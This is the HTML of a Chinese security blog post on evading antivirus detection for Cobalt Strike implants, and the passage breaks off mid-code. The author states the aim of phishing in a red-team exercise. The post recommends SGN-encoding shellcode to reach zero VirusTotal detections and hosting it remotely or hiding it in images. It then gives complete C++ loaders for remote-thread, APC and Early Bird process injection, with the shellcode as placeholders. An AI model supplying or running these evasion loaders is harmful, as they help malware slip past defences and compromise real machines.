<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" title="shutTD" href="https://shut-td.github.io/rss.xml"><link rel="alternate" type="application/atom+xml" title="shutTD" href="https://shut-td.github.io/atom.xml"><link rel="alternate" type="application/json" title="shutTD" href="https://shut-td.github.io/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><meta name="keywords" content="å…æ€"><link rel="canonical" href="https://shut-td.github.io/CS%E8%BF%9C%E6%8E%A7%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF%E4%B8%8E%E5%AE%9E%E7%8E%B0/"><title>CS è¿œæ§å…æ€æ€è·¯ä¸å®ç° - å…æ€ | shutTD's BLOG = shutTD = Cyber AD</title><meta name="generator" content="Hexo 7.0.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">CS è¿œæ§å…æ€æ€è·¯ä¸å®ç°</h1><div class="meta"><span class="item" title="åˆ›å»ºæ—¶é—´ï¼š2024-07-16 10:13:27"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">å‘è¡¨äº</span> <time itemprop="dateCreated datePublished" datetime="2024-07-16T10:13:27+08:00">2024-07-16</time> </span><span class="item" title="æœ¬æ–‡å­—æ•°"><span class="icon"><i class="ic i-pen"></i> </span><span class="text">æœ¬æ–‡å­—æ•°</span> <span>15k</span> <span class="text">å­—</span> </span><span class="item" title="é˜…è¯»æ—¶é•¿"><span class="icon"><i class="ic i-clock"></i> </span><span class="text">é˜…è¯»æ—¶é•¿</span> <span>14 åˆ†é’Ÿ</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="åˆ‡æ¢å¯¼èˆªæ "><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">shutTD's BLOG</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><ul><li class="item" data-background-image="http://dlink.host/wx1.sinaimg.cn/large/008DfUDOly8hnqog3ggb2j31hc0u0qjv.jpg"></li><li class="item" data-background-image="http://dlink.host/wx2.sinaimg.cn/large/008DfUDOly8hnqx14nahdj31hc0u041l.jpg"></li><li class="item" data-background-image="http://dlink.host/wx4.sinaimg.cn/large/008DfUDOly8hnqofyx2uuj31ht0u0n0e.jpg"></li><li class="item" data-background-image="http://dlink.host/wx2.sinaimg.cn/large/008DfUDOly8hnqx1erukaj31hc0u047x.jpg"></li><li class="item" data-background-image="http://dlink.host/wx3.sinaimg.cn/large/008DfUDOly8hnqog23v9bj30u00lpn0d.jpg"></li><li class="item" data-background-image="http://dlink.host/wx3.sinaimg.cn/large/008DfUDOly8hnqx19xgpfj31hc0u07b0.jpg"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">é¦–é¡µ</a></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E5%85%8D%E6%9D%80/" itemprop="item" rel="index" title="åˆ†ç±»äº å…æ€"><span itemprop="name">å…æ€</span></a><meta itemprop="position" content="1"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://shut-td.github.io/CS%E8%BF%9C%E6%8E%A7%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF%E4%B8%8E%E5%AE%9E%E7%8E%B0/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="shutTD"><meta itemprop="description" content="Cyber AD, èœåªå› ï½"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="shutTD"></span><div class="body md" itemprop="articleBody"><h3 id="csåŸç”Ÿshellcodeä¸Šçº¿å…æ€"><a class="anchor" href="#csåŸç”Ÿshellcodeä¸Šçº¿å…æ€">#</a> CS åŸç”Ÿ shellcode ä¸Šçº¿å…æ€</h3><p>æœ€è¿‘æ”»é˜²åœ¨å³æ‰€ä»¥æƒ³è¦å°è¯•å†™å…æ€ğŸé’“é’“é±¼ï¼Œæ‰€ä»¥å°å­¦äº†ä¸€æ‰‹ä¸€äº›æ¯”è¾ƒå¥½ç”¨ä¸”å…æ€æ•ˆæœæ¯”è¾ƒå¥½çš„æ‰‹æ³•åšä¸€ä¸‹æ€»ç»“ï¼Œä»å‡ ä¸ªè§’åº¦å»ç»„åˆå…æ€ã€‚</p><h5 id="shellcodeå…æ€"><a class="anchor" href="#shellcodeå…æ€">#</a> shellcode å…æ€</h5><p>sgn ç¼–ç  (å†…å­˜è‡ªè§£å¯†)ï¼Œå¯ä»¥å¾ˆå¥½çš„åšåˆ°é™æ€å…æ€çš„æ•ˆæœä¸éœ€è¦åšå…¶ä»–ä»»ä½•åŠ å¯†æ‰‹æ®µå³å¯åšåˆ°é™æ€å…æ€ï¼Œå¯ä»¥å°è¯• sgn ç¼–ç åä¼  vt ä¸€èˆ¬å°±æ˜¯ 0 æŸ¥æ€ã€‚</p><p>ç”¨æ³•ï¼šå°† shellcode äºŒè¿›åˆ¶æ–‡ä»¶ä¾‹å¦‚ xx.bin ä¿å­˜ï¼Œä½¿ç”¨ sgn.exe è¿›è¡Œç¼–ç ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ç³»ç»Ÿä½æ•°è¦å¯¹</p><p><strong>åŸå§‹ shellcode</strong> (ç”¨ winhex ç­‰äºŒè¿›åˆ¶ç¼–è¾‘å™¨æ‰“å¼€):<img data-src="https://dlink.host/wx4.sinaimg.cn/large/008DfUDOly8hrpo6edkdoj30hk0drwk8.jpg" alt=""><br><strong>sgn è¿›è¡Œç¼–ç </strong>:<img data-src="https://dlink.host/wx1.sinaimg.cn/large/008DfUDOly8hrpo6it3a1j30v10apmyj.jpg" alt=""><br><strong>ç¼–ç åçš„ shellcode</strong>:<img data-src="https://dlink.host/wx1.sinaimg.cn/large/008DfUDOly8hrpo6ptt93j30rs0t819n.jpg" alt=""></p><p>è¿™ç§é™æ€å…æ€æ•ˆæœå¾ˆå¥½åŸºæœ¬ä¸Šæ— éœ€åšå…¶ä»–ä»»ä½•åŠ å¯†å¤„ç†ï¼ŒåŒæ—¶è¿˜åšåˆ°äº†é™ç†µï¼Œå½“ç„¶è¿™é‡Œè¿˜å¯ä»¥å°†äºŒè¿›åˆ¶æ–‡ä»¶æ‰˜ç®¡åˆ°æœåŠ¡å™¨ä¸Šç„¶åé€šè¿‡ http è¯·æ±‚æ¥è·å– shellcodeï¼Œä¹Ÿå¯ä»¥é…åˆå›¾ç‰‡éšå†™è¿›è¡Œ shellcode çš„éšè—ã€‚</p><h4 id="ä»£ç ä¸è¿›ç¨‹æ³¨å…¥æ‰‹æ³•"><a class="anchor" href="#ä»£ç ä¸è¿›ç¨‹æ³¨å…¥æ‰‹æ³•">#</a> ä»£ç ä¸è¿›ç¨‹æ³¨å…¥æ‰‹æ³•</h4><p><em><strong>CreateRemoteThread (è¿œç¨‹çº¿ç¨‹æ³¨å…¥)</strong></em><br>æ³¨å…¥æµç¨‹ï¼š<br>1ã€æ ¹æ®è¿›ç¨‹åå¯»æ‰¾ pidï¼Œç”¨äºåç»­è¿›ç¨‹æ³¨å…¥<br>2ã€æ ¹æ® pid æ‰“å¼€æŒ‡å®šè¿›ç¨‹å¥æŸ„<br>3ã€å‘æŒ‡å®šè¿›ç¨‹ç”³è¯·å¯è¯»å¯å†™å¯æ‰§è¡Œçš„å†…å­˜åŒºåŸŸ<br>4ã€å°† shellcode æˆ– dll æ³¨å…¥åˆ°è¯¥å†…å­˜åŒºåŸŸä¸­<br>5ã€å¼€è¾Ÿä¸€ä¸ªæ–°çº¿ç¨‹æ‰§è¡Œ</p><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Tlhelp32.h&gt;</span></span></span><br><span class="line"><span class="function">DWORD <span class="title">GetProcessIdByName</span><span class="params">(LPCTSTR lpszProcessName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hSnapshot = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (hSnapshot == INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PROCESSENTRY32 pe;</span><br><span class="line">    pe.dwSize = <span class="keyword">sizeof</span> pe;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">Process32First</span>(hSnapshot, &amp;pe))</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">lstrcmpi</span>(lpszProcessName, pe.szExeFile) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">                <span class="built_in">CloseHandle</span>(hSnapshot);</span><br><span class="line">                <span class="keyword">return</span> pe.th32ProcessID;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (<span class="built_in">Process32Next</span>(hSnapshot, &amp;pe));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hSnapshot);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">char</span> path[] = <span class="string">&quot;C:\\xxx\\TestDll.dll&quot;</span>;   <span class="comment">//dllæ³¨å…¥</span></span><br><span class="line"><span class="type">char</span> shellcode[] = &#123;\x12&#125;;  <span class="comment">//shellcodeæ³¨å…¥ </span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">DllInjectMain</span><span class="params">()</span> <span class="comment">//dllæ³¨å…¥</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, <span class="number">0</span>, <span class="built_in">GetProcessIdByName</span>((LPCTSTR)<span class="string">&quot;notepad.exe&quot;</span>));    </span><br><span class="line">    LPVOID lpBaseAddress = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="number">0</span>, <span class="number">0x1000</span>, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(hProcess, lpBaseAddress, path, <span class="built_in">sizeof</span>(path), <span class="literal">NULL</span>);</span><br><span class="line">    LPTHREAD_START_ROUTINE pLoadlibrary = (LPTHREAD_START_ROUTINE)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">    <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="number">0</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)pLoadlibrary, lpBaseAddress, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="type">int</span> <span class="title">ShellcodeInjectMain</span><span class="params">()</span></span>&#123;   <span class="comment">//shellcodeæ³¨å…¥</span></span><br><span class="line">      HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, <span class="number">0</span>, <span class="built_in">GetProcessIdByName</span>((LPCTSTR)<span class="string">&quot;notepad.exe&quot;</span>));</span><br><span class="line">      LPVOID lpBaseAddress = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="number">0</span>, <span class="number">0x1000</span>(æˆ–è€…<span class="keyword">sizeof</span> shellcdoe), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">      <span class="built_in">WriteProcessMemory</span>(hProcess, lpBaseAddress, shellcode, <span class="built_in">sizeof</span>(shellcode), <span class="literal">NULL</span>);</span><br><span class="line">      <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="number">0</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)lpBaseAddress, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>è¿™ç§ç›´æ¥çš„çº¿ç¨‹æ³¨å…¥å®¹æ˜“æš´æ¯™ï¼Œå»ºè®®æ­é…å…¶ä»–æ‰‹æ®µé£Ÿç”¨ã€‚<p></p><p><em><strong>APC Injection (APC æ³¨å…¥)</strong></em><br>æ¯ä¸ªçº¿ç¨‹éƒ½æœ‰è‡ªå·±çš„ APC é˜Ÿåˆ—ï¼Œåº”ç”¨ç¨‹åºé€šè¿‡è°ƒç”¨<strong> QueueUserAPC</strong> å‡½æ•°å°† APC æ’é˜Ÿåˆ°çº¿ç¨‹ä¸­ï¼Œè°ƒç”¨çº¿ç¨‹åœ¨å¯¹<strong> QueueUserAPC</strong> çš„è°ƒç”¨ä¸­æŒ‡å®š APC å‡½æ•°çš„åœ°å€ï¼Œå½“ APC æ’é˜Ÿåˆ°çº¿ç¨‹ä¸­æ—¶ï¼Œç³»ç»Ÿä¼šå‘å‡ºè½¯ä»¶ä¸­æ–­ã€‚ä¸‹æ¬¡è°ƒåº¦çº¿ç¨‹æ—¶ï¼Œå®ƒå°†è¿è¡Œ APC åŠŸèƒ½ã€‚<br>æ³¨å…¥æµç¨‹ï¼š<br>1ã€æ ¹æ®è¿›ç¨‹åç¡®å®š pid<br>2ã€é€šè¿‡ pid éå† tid<br>3ã€æ’å…¥ APC é˜Ÿåˆ—</p><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Tlhelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">GetProcessIdByName</span><span class="params">(LPCTSTR lpszProcessName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hSnapshot = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (hSnapshot == INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PROCESSENTRY32 pe;</span><br><span class="line">    pe.dwSize = <span class="keyword">sizeof</span> pe;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">Process32First</span>(hSnapshot, &amp;pe))</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">lstrcmpi</span>(lpszProcessName, pe.szExeFile) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">                <span class="built_in">CloseHandle</span>(hSnapshot);</span><br><span class="line">                <span class="keyword">return</span> pe.th32ProcessID;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (<span class="built_in">Process32Next</span>(hSnapshot, &amp;pe));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hSnapshot);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">GetAllThreadIdByProcessId</span><span class="params">(DWORD dwProcessId)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD dwBufferLength = <span class="number">1000</span>;</span><br><span class="line">    THREADENTRY32 te32 = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    HANDLE hSnapshot = <span class="literal">NULL</span>;</span><br><span class="line">    BOOL bRet = TRUE;</span><br><span class="line">    <span class="comment">// è·å–çº¿ç¨‹å¿«ç…§</span></span><br><span class="line">    ::<span class="built_in">RtlZeroMemory</span>(&amp;te32, <span class="built_in">sizeof</span>(te32));</span><br><span class="line">    te32.dwSize = <span class="built_in">sizeof</span>(te32);</span><br><span class="line">    hSnapshot = ::<span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPTHREAD, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å–ç¬¬ä¸€æ¡çº¿ç¨‹å¿«ç…§ä¿¡æ¯</span></span><br><span class="line">    bRet = ::<span class="built_in">Thread32First</span>(hSnapshot, &amp;te32);</span><br><span class="line">    <span class="keyword">while</span> (bRet)&#123;</span><br><span class="line">        <span class="comment">// è·å–è¿›ç¨‹å¯¹åº”çš„çº¿ç¨‹ID</span></span><br><span class="line">        <span class="keyword">if</span> (te32.th32OwnerProcessID == dwProcessId)&#123;</span><br><span class="line">            <span class="keyword">return</span> te32.th32ThreadID;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// éå†ä¸‹ä¸€ä¸ªçº¿ç¨‹å¿«ç…§ä¿¡æ¯</span></span><br><span class="line">        bRet = ::<span class="built_in">Thread32Next</span>(hSnapshot, &amp;te32);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">DllInjdectMain</span><span class="params">()</span> </span>&#123;   <span class="comment">//dllæ³¨å…¥</span></span><br><span class="line">    FARPROC pLoadLibrary = <span class="literal">NULL</span>;</span><br><span class="line">    HANDLE hThread = <span class="literal">NULL</span>;</span><br><span class="line">    HANDLE hProcess = <span class="number">0</span>;</span><br><span class="line">    DWORD Threadid = <span class="number">0</span>;</span><br><span class="line">    DWORD ProcessId = <span class="number">0</span>;</span><br><span class="line">    BYTE DllName[] = <span class="string">&quot;C:\\Users\\Black Sheep\\source\\repos\\ApcInject\\x64\\Debug\\TestDll.dll&quot;</span>;</span><br><span class="line">    LPVOID AllocAddr = <span class="literal">NULL</span>;</span><br><span class="line">    ProcessId = <span class="built_in">GetProcessIdByName</span>(<span class="string">L&quot;explorer.exe&quot;</span>);</span><br><span class="line">    hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, <span class="number">0</span>, ProcessId);</span><br><span class="line">    pLoadLibrary = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">    AllocAddr = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="number">0</span>, <span class="built_in">sizeof</span>(DllName) + <span class="number">1</span>, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(hProcess, AllocAddr, DllName, <span class="built_in">sizeof</span>(DllName) + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    Threadid = <span class="built_in">GetAllThreadIdByProcessId</span>(ProcessId);</span><br><span class="line">    hThread = <span class="built_in">OpenThread</span>(THREAD_ALL_ACCESS, <span class="number">0</span>, Threadid);</span><br><span class="line">    <span class="built_in">QueueUserAPC</span>((PAPCFUNC)pLoadLibrary, hThread, (ULONG_PTR)AllocAddr);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">ShellcodeInjectMain</span><span class="params">()</span></span>&#123;   <span class="comment">//shellcodeæ³¨å…¥</span></span><br><span class="line">    HANDLE hThread = <span class="literal">NULL</span>;</span><br><span class="line">    HANDLE hProcess = <span class="number">0</span>;</span><br><span class="line">    DWORD Threadid = <span class="number">0</span>;</span><br><span class="line">    DWORD ProcessId = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> shellcode[] = &#123;\x12&#125;; <span class="comment">//shellcode</span></span><br><span class="line">    ProcessId = <span class="built_in">GetProcessIdByName</span>(<span class="string">L&quot;explorer.exe&quot;</span>);</span><br><span class="line">    hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, <span class="number">0</span>, ProcessId);</span><br><span class="line">    LPVOID lpBaseeAddresss = (LPVOID)<span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0X1000</span>, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(hProcess, lpBaseeAddresss, shellcode, <span class="built_in">sizeof</span>(shellcode) + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    Threadid = <span class="built_in">GetAllThreadIdByProcessId</span>(ProcessId);</span><br><span class="line">    hThread = <span class="built_in">OpenThread</span>(THREAD_ALL_ACCESS, <span class="number">0</span>, Threadid);</span><br><span class="line">    <span class="built_in">QueueUserAPC</span>((PAPCFUNC)lpBaseeAddresss, hThread, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p><em><strong>Early Bird (è¿›é˜¶ç‰ˆ APC æ³¨å…¥)</strong></em><br>å…ˆåˆ›å»ºä¸€ä¸ªæŒ‚èµ·çš„ç™½è¿›ç¨‹å¹¶ç”³è¯·ä¸€å— RWX å†…å­˜ç”¨äºå†™å…¥ shellcodeï¼Œå†ä½¿ç”¨ APC æ³¨å…¥æ’å…¥çº¿ç¨‹ï¼Œå†æ¢å¤çº¿ç¨‹ã€‚å®é™…ä¸Šå°±æ˜¯åœ¨ç™½è¿›ç¨‹ä¸Šå·æ‘¸æ³¨å…¥ä¸€ä¸ªæ–°çº¿ç¨‹è·‘ shellcodeã€‚<br>æ³¨å…¥æµç¨‹è·Ÿä¸Šè¿° APC æ³¨å…¥å·®ä¸å¤š</p><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] = &#123;<span class="string">&quot;\0x1&quot;</span>&#125;;  <span class="comment">//æ¶æ„shellcode</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    STARTUPINFO si = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    PROCESS_INFORMATION pi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    si.cb = <span class="built_in">sizeof</span>(STARTUPINFO);   </span><br><span class="line">    </span><br><span class="line">    <span class="built_in">CreateProcessA</span>(<span class="string">&quot;C:\\Windows\\System32\\notepad.exe&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, TRUE, CREATE_SUSPENDED | EMBDHLP_CREATENOW, <span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPSTARTUPINFOA)&amp;si, &amp;pi);</span><br><span class="line">    LPVOID lpBaseeAddresss = (LPVOID)<span class="built_in">VirtualAllocEx</span>(pi.hProcess, <span class="literal">NULL</span>, <span class="number">0X1000</span>, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(pi.hProcess, lpBaseeAddresss, (LPVOID)shellcode, <span class="built_in">sizeof</span>(shellcode), <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">QueueUserAPC</span>((PAPCFUNC)lpBaseeAddresss, pi.hThread, <span class="literal">NULL</span>);</span><br><span class="line">    </span><br><span 